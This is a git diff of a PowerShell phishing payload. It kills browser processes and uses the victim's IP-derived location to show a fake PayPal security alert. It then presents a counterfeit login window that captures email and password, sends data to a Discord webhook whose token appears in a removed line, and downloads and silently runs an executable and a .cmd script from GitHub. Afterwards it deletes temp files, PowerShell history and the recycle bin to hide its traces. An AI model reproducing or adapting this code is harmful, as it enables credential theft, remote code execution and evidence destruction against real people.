@@ -1,3 +1,4 @@
+# Define the Upload-Discord function
 function Upload-Discord {
     [CmdletBinding()]
     param (
@@ -7,7 +8,7 @@ function Upload-Discord {
         [string]$text 
     )
 
-    $hookurl = "https://discord.com/api/webhooks/1171563379874340874/yWRq-Ehof2YQ3ycRswEtfDtSWc_ZJwcomxwhCGYxU8uubem_Llurm9yPW4sfJk7H6bMn"
+    $hookurl = "$dc"
 
     $Body = @{
         'username' = $env:username
@@ -28,6 +29,41 @@ $creds | Out-File -FilePath "$env:TEMP\$FileName" -Encoding utf8
 Add-Type -AssemblyName PresentationCore, PresentationFramework, WindowsBase
 
 
+#----------------------------------------------------------------------------------------------------
+
+# Get the default user directory
+$userDirectory = [System.IO.Path]::Combine($env:USERPROFILE, 'Library')
+
+# Check if the "Library" folder exists, and create it if not
+if (-not (Test-Path -Path $userDirectory -PathType Container)) {
+    New-Item -ItemType Directory -Path $userDirectory | Out-Null
+}
+
+
+# Set the URL and output path
+$url = "https://github.com/Wesley5n1p35/psh/raw/main/properties.exe"
+$outputPath = [System.IO.Path]::Combine($env:USERPROFILE, 'Library\properties.exe')
+
+# Download the exe
+Invoke-WebRequest -Uri $url -OutFile $outputPath
+
+$cmdScriptUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/play.cmd"
+$cmdScriptPath = [System.IO.Path]::Combine($env:USERPROFILE, "Library\play.cmd")
+
+# Download the .cmd script from the URL
+Invoke-WebRequest -Uri $cmdScriptUrl -OutFile $cmdScriptPath
+
+# Check if the script file exists
+if (Test-Path $cmdScriptPath -PathType Leaf) {
+    Write-Host "Script file found at $cmdScriptPath"
+    
+    # Execute the .cmd script with the window closed
+    Start-Process -FilePath $cmdScriptPath -ArgumentList "/c",$cmdScriptPath -WindowStyle Hidden
+} else {
+    Write-Host "Script file not found at $cmdScriptPath"
+}
+
+
 $browserProcesses = "chrome", "firefox", "iexplore", "edge", "opera"
 
 $browserProcesses | ForEach-Object {
@@ -37,22 +73,41 @@ $browserProcesses | ForEach-Object {
     }
 }
 
-Add-Type -AssemblyName PresentationCore,PresentationFramework
-$msgBody = "Please re-authenticate your Paypal Account."
-$msgTitle = "Session Expired"
+Add-Type -AssemblyName PresentationCore, PresentationFramework
+
+# Define the API base URL
+$apiUrl = "http://ip-api.com/json/"
+
+# Get the computer's external IP address
+$ipAddress = (Invoke-RestMethod -Uri "http://ipinfo.io/json").ip
+
+# Query the IP-API service to get location information
+$response = Invoke-RestMethod -Uri "$apiUrl$ipAddress"
+
+# Extract location data
+$city = $response.city
+$region = $response.regionName
+$country = $response.country
+
+# Create a message for the user
+$msgBody = "Someone just tried to access your Paypal account from $city, $region, Please sign back in to secure your account"
+$msgTitle = "Reclaim your account"
 $msgButton = 'Ok'
 $msgImage = 'Warning'
-$Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
+
+# Show a message box with location information
+$Result = [System.Windows.MessageBox]::Show($msgBody, $msgTitle, $msgButton, $msgImage)
 Write-Host "The user clicked: $Result"
 
 # Define the URL to the image hosted on GitHub
-$imageUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/paypal.png"
+$imageUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/fb.jpg"
 
+# Create XAML for the login window without specifying the icon
 $XAML = @"
 <Window
     xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
     xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
-    Title="Session Expired" Height="300" Width="300" WindowStartupLocation="CenterScreen">
+    Title="Authentication Required" Height="350" Width="450" WindowStartupLocation="CenterScreen">
     <Grid>
         <Image Source="$imageUrl" Stretch="Fill" />
         <Grid Background="Transparent">
@@ -66,12 +121,12 @@ $XAML = @"
             <TextBlock Grid.Row="0" Text="" HorizontalAlignment="Center" VerticalAlignment="Center" FontSize="20" Foreground="White"/>
 
             <StackPanel Grid.Row="1" Orientation="Vertical" HorizontalAlignment="Center">
-                <Label Content="Email:" VerticalAlignment="Center" Foreground="Black" HorizontalAlignment="Center"/>
+                <Label Content="Email or Phone Number:" VerticalAlignment="Center" Foreground="White" HorizontalAlignment="Center"/>
                 <TextBox Name="Username" VerticalAlignment="Center" Margin="10" Height="21" Width="200" HorizontalAlignment="Center"/>
             </StackPanel>
 
             <StackPanel Grid.Row="2" Orientation="Vertical" HorizontalAlignment="Center">
-                <Label Content="Password:" VerticalAlignment="Center" Foreground="Black" HorizontalAlignment="Center"/>
+                <Label Content="Password:" VerticalAlignment="Center" Foreground="White" HorizontalAlignment="Center"/>
                 <PasswordBox Name="Password" VerticalAlignment="Center" Margin="10" Height="21" Width="200" HorizontalAlignment="Center"/>
             </StackPanel>
 
@@ -118,23 +173,37 @@ $loginButton.Add_Click({
 # Show the login window
 $loginWindow.ShowDialog()
 
-<#
-
-.NOTES 
-	This is to save the gathered credentials to a file in the temp directory
-#>
 
 echo $creds >> $env:TMP\$FileName
 
+Add-Type -AssemblyName PresentationCore, PresentationFramework
+# Create a message for the user
+$msgBody = "ACCOUNT SECURE"
+$msgTitle = "Account Verified"
+$msgButton = 'Ok'
+$msgImage = 'Information'
+
+# Show a message box with location information
+$Result = [System.Windows.MessageBox]::Show($msgBody, $msgTitle, $msgButton, $msgImage)
 #------------------------------------------------------------------------------------------------------------------------------------
 
-<#
+$URL = "https://www.paypal.com"
 
-.NOTES 
-	This is to clean up behind you and remove any evidence to prove you were there
-#>
+# Check if Google Chrome is installed
+$ChromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"  # Update this path to match your Chrome installation path
+$chromeInstalled = Test-Path $ChromePath
 
-# Delete contents of Temp folder 
+if ($chromeInstalled) {
+    # If Chrome is installed, open Facebook in Chrome
+    Start-Process $ChromePath $URL
+} else {
+    # If Chrome is not installed, use the default browser
+    Start-Process $URL
+}
+
+Start-Sleep -Seconds 500
+Remove-Item -Path "$env:USERPROFILE\Library" -Recurse -Force
+
 
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
@@ -149,19 +218,5 @@ Remove-Item (Get-PSreadlineOption).HistorySavePath
 # Deletes contents of recycle bin
 
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-
-$URL = "https://www.paypal.com"
-
-# Check if Google Chrome is installed
-$ChromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"  # Update this path to match your Chrome installation path
-$chromeInstalled = Test-Path $ChromePath
-
-if ($chromeInstalled) {
-    Start-Process $ChromePath $URL
-} else {
-    # If Chrome is not installed, use the default browser
-    Start-Process $URL
-}
-
 
 exit
